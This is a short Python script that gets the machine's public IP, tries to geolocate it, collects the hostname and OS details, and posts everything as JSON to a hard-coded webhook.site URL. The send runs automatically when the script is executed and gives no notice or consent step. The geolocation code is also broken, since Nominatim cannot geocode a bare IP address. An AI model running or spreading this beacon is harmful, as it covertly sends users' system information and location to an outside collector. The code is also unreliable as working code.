import requests
import socket
import platform
import json
from geopy.geocoders import Nominatim

def get_location():
    geolocator = Nominatim(user_agent="location_sender")
    ip = requests.get("https://api.ipify.org").text
    location = geolocator.geocode(ip, language="en")
    return location.latitude, location.longitude

def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()
    info['os_release'] = platform.release()
    info['architecture'] = platform.machine()
    return info

def send_data():
    location = get_location()
    info = get_system_info()
    data = {
        "latitude": location[0],
        "longitude": location[1],
        "system_info": info
    }
    headers = {'Content-type': 'application/json'}
    url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
    response = requests.post(url, data=json.dumps(data), headers=headers)
    print(response.content)

send_data()
